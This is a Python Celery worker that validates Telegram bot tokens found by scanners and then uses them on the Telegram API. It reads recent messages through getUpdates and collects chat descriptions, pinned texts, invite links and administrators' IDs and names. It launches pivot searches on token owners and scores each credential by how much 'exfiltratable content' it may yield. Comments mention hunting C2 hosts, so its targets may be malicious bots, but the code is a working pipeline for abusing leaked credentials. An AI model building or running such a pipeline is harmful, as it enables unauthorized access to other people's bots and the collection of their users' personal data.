"""
Token validation worker — async validation off the scanner critical path.

Architecture:
    Scanner finds N tokens → enqueues N `validation.validate_token` tasks.
    Dedicated `worker-validators` pulls them off the `validation` queue with
    a Redis-backed global token bucket rate limiter (1 getMe per N seconds
    across ALL validator workers, not per-batch).

Why:
    Old design ran validation INSIDE scanner tasks with VALIDATE_BATCH_CAP=50.
    Result sets > 50 dropped tokens silently, scanner runs took 10-15 min
    blocking the queue, and burst getMe calls triggered Telegram per-IP
    secondary rate limits that cascaded into bot_restricted cooldowns.

Rate limiter:
    Redis key `rate_limit:telegram_getMe` — incremented atomically by every
    worker that calls _acquire_rate_token().  Shared across ALL validator workers
    (processes) because the key lives in Redis, not in process memory.
    If counter > RATE_MAX_CALLS within the window, the calling coroutine sleeps
    until the window expires and retries.
    Default: 30 calls / 10 seconds = ~3 calls/sec sustained.

    There is NO Celery-level rate_limit on validate_token.  A per-worker Celery
    cap would allow each of the N concurrency workers to independently consume
    up to the cap, multiplying burst throughput by N and defeating the Redis gate.
    The Redis bucket is the single, process-global rate control.
"""
import asyncio
import hashlib
import logging
import os
import time

import httpx

from app.core.database import db
from app.core.security import security
from app.services.scanners import _is_valid_token
from app.workers.celery_app import app
from app.workers.tasks.flow_tasks import async_execute, redis_client

logger = logging.getLogger("validation.tasks")
logger.setLevel(logging.INFO)


# ============================================
# RATE LIMITER (Redis token bucket — global across all validator workers)
# ============================================

RATE_LIMIT_KEY = "rate_limit:telegram_getMe"
RATE_MAX_CALLS = int(os.getenv("VALIDATE_RATE_MAX", 30))      # 30 calls...
RATE_WINDOW_SECONDS = int(os.getenv("VALIDATE_RATE_WINDOW", 10))  # ...per 10s
RATE_MAX_WAIT = float(os.getenv("VALIDATE_RATE_MAX_WAIT", 30.0))  # cap blocking time


async def _acquire_rate_token() -> None:
    """
    Atomic token-bucket acquire backed by Redis.

    Uses pipelined INCR + EXPIRE — first call in the window sets TTL.
    If counter exceeds RATE_MAX_CALLS, sleeps until window expires and retries.

    Caps total wait at RATE_MAX_WAIT to avoid worker hangs on rate-storm.
    """
    deadline = time.monotonic() + RATE_MAX_WAIT
    while True:
        # Atomic INCR + conditional EXPIRE
        pipe = redis_client.pipeline()
        pipe.incr(RATE_LIMIT_KEY)
        pipe.ttl(RATE_LIMIT_KEY)
        count, ttl = pipe.execute()

        # Set TTL on first call in window (count==1) OR if TTL is missing.
        # Pipeline executes INCR then TTL atomically, but TTL is read BEFORE
        # INCR takes effect in the same pipeline batch — so first-call detection
        # via count==1 is more reliable than ttl<0 alone.
        if count == 1 or ttl < 0:
            redis_client.expire(RATE_LIMIT_KEY, RATE_WINDOW_SECONDS)
            ttl = RATE_WINDOW_SECONDS

        if count <= RATE_MAX_CALLS:
            return

        # Over budget — sleep until window expires (TTL seconds + jitter)
        sleep_for = max(ttl, 1) + 0.5
        if time.monotonic() + sleep_for > deadline:
            logger.warning(
                f"[RateLimit] Wait would exceed {RATE_MAX_WAIT}s cap "
                f"(count={count}, ttl={ttl}s) — proceeding anyway"
            )
            return
        logger.debug(f"[RateLimit] Over budget ({count}/{RATE_MAX_CALLS}), sleeping {sleep_for}s")
        await asyncio.sleep(sleep_for)


def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()


# ============================================
# VALIDATION TASK
# ============================================

@app.task(
    name="validation.validate_token",
    queue="validation",
    autoretry_for=(httpx.RequestError,),
    retry_backoff=True,
    max_retries=3,
    # NOTE: NO Celery rate_limit here.
    # Throughput is governed entirely by the Redis token bucket in _acquire_rate_token()
    # (key: rate_limit:telegram_getMe, default 30 calls / 10s).
    # A Celery rate_limit="60/m" would be a PER-WORKER cap — with concurrency=4 that
    # allows 4 × 60 = 240 calls/min to escape the Redis gate simultaneously, defeating
    # the global limit entirely.  The Redis bucket is the single source of truth.
)
def validate_token(item: dict, source_name: str):
    """
    Validate a single token from a scanner result.

    Args:
        item: dict with at least {"token": str}, optionally {"chat_id", "meta"}
        source_name: scanner that found this token (for provenance)
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_validate_token_async(item, source_name))


async def _validate_token_async(item: dict, source_name: str) -> int:
    """Returns 1 if saved/updated, 0 otherwise."""
    token = item.get("token")
    if not token or token == "MANUAL_REVIEW_REQUIRED":
        return 0

    # Step 1: Format check (cheap — do BEFORE rate-limiting)
    if not _is_valid_token(token):
        logger.debug(f"[Validate] Invalid format: {token[:15]}...")
        return 0

    # Own-bot guard — hard stop before ANY Telegram API call or DB write.
    # MONITOR_BOT_TOKEN covers all our own bots. If a scanner finds our own
    # token (e.g. via telegram_search), drop it here silently.
    if _scraper_srv_is_monitor(token):
        logger.debug("[Validate] Own monitor bot token — silently dropping")
        return 0

    token_hash = _calculate_hash(token)
    extracted_chat_id = item.get("chat_id")

    try:
        # Step 2: Dedupe check — skip if already exists with chat_id
        existing = await async_execute(
            db.table("discovered_credentials")
            .select("id, chat_id, meta")
            .eq("token_hash", token_hash)
        )
        existing_id = None
        existing_meta = {}
        existing_has_chat = False
        if existing.data:
            existing_id = existing.data[0]["id"]
            existing_meta = existing.data[0].get("meta") or {}
            existing_has_chat = existing.data[0].get("chat_id") is not None
            if existing_has_chat:
                logger.debug(f"[Validate] Token {token[:10]}... already has chat_id, skipping")
                return 0

        # Step 3: Rate-limited getMe (the expensive call)
        await _acquire_rate_token()

        # Variables that must outlive the http client block (used in persist step)
        webhook_url = None
        chat_enrichment: dict = {}

        async with httpx.AsyncClient(timeout=10.0) as client:
            base_url = f"https://api.telegram.org/bot{token}"
            me_data = None
            me_res = None
            for attempt in range(2):
                try:
                    me_res = await client.get(f"{base_url}/getMe")
                    me_data = me_res.json()
                    if me_res.status_code == 200 and me_data.get("ok"):
                        break
                except Exception:
                    if attempt == 0:
                        await asyncio.sleep(1)
                    continue

            if not me_res or me_res.status_code != 200 or not me_data.get("ok"):
                logger.debug(
                    f"[Validate] Token invalid (HTTP {me_res.status_code if me_res else 'timeout'})"
                )
                return 0

            bot_info = me_data.get("result", {})
            bot_username = bot_info.get("username", "unknown")
            logger.info(f"[Validate] ✅ @{bot_username} (id={bot_info.get('id')})")

            # ---- Bundle 1.4: getWebhookInfo (capture C2 host if set) ----
            try:
                wh_res = await client.get(f"{base_url}/getWebhookInfo", timeout=5.0)
                if wh_res.status_code == 200:
                    wh_data = wh_res.json()
                    if wh_data.get("ok"):
                        webhook_url = (wh_data.get("result") or {}).get("url") or None
                        if webhook_url:
                            logger.info(f"[Validate] 🪝 webhook → {webhook_url[:80]}")
            except Exception:
                pass  # webhook info is bonus; never block the main path

            # ---- Bundle 1: Pivot fan-out (fire-and-forget) ----
            try:
                from app.workers.tasks.pivot_tasks import (
                    search_bot_username,
                    search_github_user,
                    search_webhook_host,
                )
                # Seed 1: GitHub owner (if source meta carries repo)
                meta_in = item.get("meta") or {}
                repo = meta_in.get("repo")  # format "owner/repo"
                if repo and "/" in repo:
                    owner = repo.split("/")[0]
                    if owner:
                        search_github_user.apply_async(args=[owner], queue="validation")

                # Seed 2: Bot @username (always available from getMe)
                if bot_username and bot_username != "unknown":
                    search_bot_username.apply_async(args=[bot_username], queue="validation")

                # Seed 3: Webhook host (only if set)
                if webhook_url:
                    search_webhook_host.apply_async(args=[webhook_url], queue="validation")
            except Exception as e:
                # Pivot failure must NEVER block the main validation pipeline
                logger.debug(f"[Validate] Pivot fan-out failed (non-fatal): {e}")

            # Step 4: Resolve chat_id (extracted > getUpdates > none)
            chat_id = extracted_chat_id
            chat_name = None
            chat_type = None

            if not chat_id:
                from app.services.scraper_srv import scraper_service as _scraper_srv
                if not _scraper_srv.is_monitor_bot(token):
                    try:
                        # getUpdates also counts toward rate budget
                        await _acquire_rate_token()
                        upd_res = await client.get(
                            f"{base_url}/getUpdates", params={"limit": 10}
                        )
                        if upd_res.status_code == 200 and upd_res.json().get("ok"):
                            for update in upd_res.json().get("result", []):
                                for key in ["message", "channel_post", "my_chat_member"]:
                                    if key in update and update[key].get("chat"):
                                        chat = update[key]["chat"]
                                        chat_id = chat.get("id")
                                        chat_name = (
                                            chat.get("title")
                                            or chat.get("username")
                                            or chat.get("first_name")
                                        )
                                        chat_type = chat.get("type")
                                        break
                                if chat_id:
                                    break
                    except Exception as e:
                        logger.warning(f"[Validate] getUpdates failed: {e}")

            # ---- Bundle 4: enrichment + confidence scoring ----
            # Collect richer chat metadata via getChat / getChatAdministrators
            # when we have a chat_id. Best-effort — failures never block save.
            if chat_id:
                chat_enrichment = await _enrich_chat(chat_id, base_url, client)

        # Confidence score derived from collected signals (always computed,
        # outside the http client block — pure data transformation)
        confidence_score, confidence_reasons = _score_credential(
            chat_id=chat_id,
            chat_type=chat_type,
            webhook_url=webhook_url,
            chat_enrichment=chat_enrichment if chat_id else {},
            bot_username=bot_username,
        )

        # Step 5: Persist (UPDATE existing or INSERT new)
        if existing_id and chat_id:
            # Update existing — stored meta wins to preserve enrichment
            merged_meta = {
                **item.get("meta", {}),
                **existing_meta,
                "last_seen_source": source_name,
                "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            }
            if webhook_url:
                merged_meta["webhook_url"] = webhook_url
            if chat_enrichment:
                merged_meta.update(chat_enrichment)
            # Write both keys during rename transition: collection_yield_score is
            # the canonical name; confidence_score is retained as a legacy alias.
            merged_meta["collection_yield_score"] = confidence_score
            merged_meta["confidence_score"] = confidence_score
            merged_meta["collection_yield_reasons"] = confidence_reasons
            merged_meta["confidence_reasons"] = confidence_reasons
            update_data = {
                "chat_id": chat_id,
                "status": "active",
                "meta": merged_meta,
            }
            if chat_name:
                update_data["chat_name"] = chat_name
            if chat_type:
                update_data["chat_type"] = chat_type
            await async_execute(
                db.table("discovered_credentials").update(update_data).eq("id", existing_id)
            )
            logger.info(f"[Validate] 🆙 Updated {existing_id} with chat_id {chat_id}")
            return 1

        if existing_id and not chat_id:
            # Re-queue enrichment with cooldown (per BUG-010)
            from app.core.redis_srv import redis_srv
            cooldown_key = f"enrich_requeue:{existing_id}"
            if not redis_srv.is_on_cooldown(cooldown_key):
                from app.workers.tasks.flow_tasks import enrich_credential
                enrich_credential.delay(existing_id)
                redis_srv.set_cooldown(cooldown_key, 3600)
            return 0

        # New record
        new_data = {
            "bot_token": security.encrypt(token),
            "token_hash": token_hash,
            "chat_id": chat_id,
            "chat_name": chat_name,
            "chat_type": chat_type,
            "bot_id": str(bot_info.get("id")),
            "bot_username": bot_username,
            "source": source_name,
            "status": "pending" if not chat_id else "active",
            "meta": {
                **item.get("meta", {}),
                "bot_username": bot_username,
                "bot_id": bot_info.get("id"),
                "chat_name": chat_name,
                "chat_type": chat_type,
                **({"webhook_url": webhook_url} if webhook_url else {}),
                **(chat_enrichment or {}),
                # Write both keys during rename transition (see migration 20260903000003).
                "collection_yield_score": confidence_score,
                "confidence_score": confidence_score,
                "collection_yield_reasons": confidence_reasons,
                "confidence_reasons": confidence_reasons,
            },
        }
        res = await async_execute(db.table("discovered_credentials").insert(new_data))
        if res.data:
            new_id = res.data[0]["id"]
            status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"

            from app.workers.tasks.flow_tasks import enrich_credential, get_broadcaster
            await get_broadcaster().send_log(
                f"🎯 [{source_name}] **New Bot Token!**\n"
                f"Bot: @{bot_username}\n"
                f"ID: `{new_id}`\n"
                f"Status: {status_label}"
            )
            enrich_credential.delay(new_id)
            return 1

    except Exception as e:
        # Race condition: two validators raced on the same token, second
        # hit unique-constraint violation. Benign — first won, this is a no-op.
        # Postgres code 23505 = unique_violation.
        err_str = str(e)
        if "23505" in err_str or "duplicate key" in err_str.lower():
            logger.debug(f"[Validate] Duplicate token (raced): {token[:10]}... — first writer won")
            return 0
        # Log without exc_info to avoid embedding the raw exception chain which
        # may reference the local `token` variable in some Python traceback frames.
        logger.error(f"[Validate] Error processing token {token[:10]}...: {err_str}")

    return 0


# ============================================
# Bundle 2.2: Token validity refresh loop
# ============================================

@app.task(
    name="validation.refresh_pending_tokens",
    autoretry_for=(Exception,),
    retry_backoff=True,
    max_retries=1,
)
def refresh_pending_tokens():
    """Re-enqueue validation for all 'pending' tokens (no chat_id resolved yet).

    Some bot owners activate dormant bots later — re-validating periodically
    recovers chat_id resolution for free.
    """
    from app.workers.celery_app import _run_sync
    return _run_sync(_refresh_pending_tokens_async())


async def _refresh_pending_tokens_async():
    if redis_client.get("system:paused"):
        return "paused"

    # Cursor-based pagination — advances through ALL pending tokens across successive
    # runs instead of re-processing the same oldest-500 every time.
    # Key stores the last-seen `updated_at` ISO string; reset when batch is empty.
    REFRESH_CURSOR_KEY = "refresh_pending:cursor"
    REFRESH_BATCH_SIZE = int(os.getenv("REFRESH_PENDING_BATCH_SIZE", 500))
    cursor_val = redis_client.get(REFRESH_CURSOR_KEY)

    q = (
        db.table("discovered_credentials")
        .select("id, bot_token, meta")
        .is_("chat_id", "null")
        .order("updated_at", desc=False)
        .limit(REFRESH_BATCH_SIZE)
    )
    if cursor_val:
        q = q.gt("updated_at", cursor_val)
    res = await async_execute(q)
    rows = res.data or []

    # Advance or reset cursor
    try:
        if rows:
            redis_client.set(REFRESH_CURSOR_KEY, rows[-1]["updated_at"], ex=86400 * 7)
        else:
            redis_client.delete(REFRESH_CURSOR_KEY)  # full pass done, restart
            logger.info("[Refresh] Full pending sweep complete, cursor reset.")
    except Exception:
        pass

    enqueued = 0
    for row in rows:
        encrypted_token = row.get("bot_token")
        if not encrypted_token:
            continue
        try:
            token = security.decrypt(encrypted_token)
        except Exception:
            continue
        if not token:
            continue
        # Re-enqueue (validate_token handles dedup, Redis dedup, getMe)
        validate_token.apply_async(
            args=[{"token": token, "meta": row.get("meta") or {}}, "refresh_pending"],
            queue="validation",
        )
        enqueued += 1
        if enqueued % 50 == 0:
            await asyncio.sleep(1)  # pace the enqueue burst
    logger.info(f"[Refresh] re-enqueued {enqueued} pending tokens")
    return f"refreshed:{enqueued}"


# ============================================
# Bundle 4: enrichment + confidence helpers
# ============================================

async def _enrich_chat(chat_id, base_url: str, client) -> dict:
    """Best-effort getChat + getChatAdministrators enrichment.

    Returns a dict of fields to merge into meta. NEVER raises — every API
    failure logs and returns whatever was collected so far.
    """
    out: dict = {}

    # getChat — description, member_count, pinned_message
    try:
        await _acquire_rate_token()
        cr = await client.get(
            f"{base_url}/getChat", params={"chat_id": chat_id}, timeout=5.0
        )
        if cr.status_code == 200:
            cdata = cr.json()
            if cdata.get("ok"):
                ch = cdata.get("result") or {}
                if ch.get("description"):
                    out["chat_description"] = ch["description"][:500]
                pinned = ch.get("pinned_message") or {}
                pinned_text = pinned.get("text") or pinned.get("caption")
                if pinned_text:
                    out["chat_pinned_text"] = pinned_text[:500]
                if ch.get("invite_link"):
                    out["chat_invite_link"] = ch["invite_link"]
    except Exception as e:
        logger.debug(f"[Validate:enrich] getChat failed: {e}")

    # getChatMemberCount — separate endpoint for groups/supergroups/channels
    try:
        await _acquire_rate_token()
        mr = await client.get(
            f"{base_url}/getChatMemberCount", params={"chat_id": chat_id}, timeout=5.0
        )
        if mr.status_code == 200:
            mdata = mr.json()
            if mdata.get("ok"):
                count = mdata.get("result")
                if isinstance(count, int):
                    out["chat_member_count"] = count
    except Exception as e:
        logger.debug(f"[Validate:enrich] getChatMemberCount failed: {e}")

    # getChatAdministrators — admin user IDs (operator pivot key)
    try:
        await _acquire_rate_token()
        ar = await client.get(
            f"{base_url}/getChatAdministrators", params={"chat_id": chat_id}, timeout=5.0
        )
        if ar.status_code == 200:
            adata = ar.json()
            if adata.get("ok"):
                admins = adata.get("result") or []
                # Only retain user-id + handle pairs, skip the rest (PII volume)
                admin_summaries = []
                for a in admins[:20]:  # cap at 20 to avoid bloat
                    u = a.get("user") or {}
                    if u.get("is_bot"):
                        continue
                    admin_summaries.append({
                        "id": u.get("id"),
                        "username": u.get("username"),
                        "first_name": u.get("first_name"),
                        "status": a.get("status"),
                    })
                if admin_summaries:
                    out["chat_admins"] = admin_summaries
    except Exception as e:
        logger.debug(f"[Validate:enrich] getChatAdministrators failed: {e}")

    if out:
        logger.info(f"[Validate:enrich] +{len(out)} fields for chat={chat_id}")
    return out


def _score_credential(
    *,
    chat_id,
    chat_type: str,
    webhook_url: str,
    chat_enrichment: dict,
    bot_username: str,
) -> tuple:
    """Compute a 0-100 confidence score + list of human-readable reasons.

    Higher = more likely to yield exfiltratable content. Designed for
    dashboard sort-by-value, not gate-keeping.
    """
    score = 0
    reasons = []

    # Base: chat_id resolution alone is the foundation
    if chat_id:
        score += 30
        reasons.append("chat_id_resolved")
    else:
        reasons.append("no_chat_id")

    # Webhook configured = bot is in production use, not a test/abandoned
    if webhook_url:
        score += 20
        reasons.append("webhook_configured")

    # Chat type signal
    if chat_type == "supergroup":
        score += 15
        reasons.append("chat_type_supergroup")
    elif chat_type == "group":
        score += 10
        reasons.append("chat_type_group")
    elif chat_type == "channel":
        score += 12
        reasons.append("chat_type_channel")
    elif chat_type == "private":
        score += 5
        reasons.append("chat_type_private")

    # Member count signal — bigger = more activity to exfiltrate
    member_count = (chat_enrichment or {}).get("chat_member_count")
    if isinstance(member_count, int):
        if member_count >= 1000:
            score += 20
            reasons.append("members_1000+")
        elif member_count >= 100:
            score += 12
            reasons.append("members_100+")
        elif member_count >= 10:
            score += 6
            reasons.append("members_10+")

    # Description present = curated, intentional bot
    if (chat_enrichment or {}).get("chat_description"):
        score += 5
        reasons.append("has_description")

    # Pinned message = admin announcements (often high-value content)
    if (chat_enrichment or {}).get("chat_pinned_text"):
        score += 8
        reasons.append("has_pinned_message")

    # Admins enumerated = operator pivot opportunity
    admins = (chat_enrichment or {}).get("chat_admins") or []
    if len(admins) >= 1:
        score += 5
        reasons.append("admins_enumerated")

    # Cap at 100
    score = min(score, 100)
    return score, reasons


def _scraper_srv_is_monitor(token: str) -> bool:
    """Thin wrapper to call scraper_service.is_monitor_bot without import cycles."""
    try:
        from app.services.scraper_srv import scraper_service as _s
        return _s.is_monitor_bot(token)
    except Exception:
        return False


# ============================================================
# Backfill: score + enrich all active rows missing collection_yield_score
# ============================================================

@app.task(name="validation.backfill_scoring", queue="validation")
def backfill_scoring(batch_size: int = 50):
    """Re-run getChat enrichment + yield scoring on active rows
    that have a chat_id but no collection_yield_score in meta yet.
    (Also covers legacy rows keyed only under confidence_score.)

    Does NOT call getMe (token already confirmed live).
    Runs in batches — safe to call repeatedly via beat or manually.
    """
    from app.workers.celery_app import _run_sync
    return _run_sync(_backfill_scoring_async(batch_size))


async def _backfill_scoring_async(batch_size: int):
    import httpx

    from app.core.security import security

    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, bot_token, chat_id, chat_type, bot_username, meta")
        .eq("status", "active")
        .not_.is_("chat_id", "null")
        .or_("meta->>collection_yield_score.is.null,meta->>confidence_score.is.null")
        .order("updated_at", desc=False)
        .limit(batch_size)
    )
    rows = res.data or []
    if not rows:
        logger.info("[Backfill] no rows need scoring — done")
        return 0

    logger.info(f"[Backfill] scoring {len(rows)} rows")
    done = 0
    async with httpx.AsyncClient(timeout=8.0) as client:
        for row in rows:
            try:
                token = security.decrypt(row["bot_token"])
                if _scraper_srv_is_monitor(token):
                    continue
                base_url = f"https://api.telegram.org/bot{token}"
                chat_id = row["chat_id"]
                await _acquire_rate_token()
                enrichment = await _enrich_chat(chat_id, base_url, client)
                score, reasons = _score_credential(
                    chat_id=chat_id,
                    chat_type=row.get("chat_type"),
                    webhook_url=(row.get("meta") or {}).get("webhook_url"),
                    chat_enrichment=enrichment,
                    bot_username=row.get("bot_username"),
                )
                new_meta = {**(row.get("meta") or {}), **enrichment,
                    # Write both keys during rename transition.
                    "collection_yield_score": score,
                    "confidence_score": score,
                    "collection_yield_reasons": reasons,
                    "confidence_reasons": reasons,
                }
                await async_execute(
                    db.table("discovered_credentials")
                    .update({
                        "meta": new_meta,
                        "updated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
                    })
                    .eq("id", row["id"])
                )
                done += 1
            except Exception as e:
                logger.warning(f"[Backfill] row {row['id'][:8]} failed: {e}")
                continue

    logger.info(f"[Backfill] scored {done}/{len(rows)} rows")
    return done
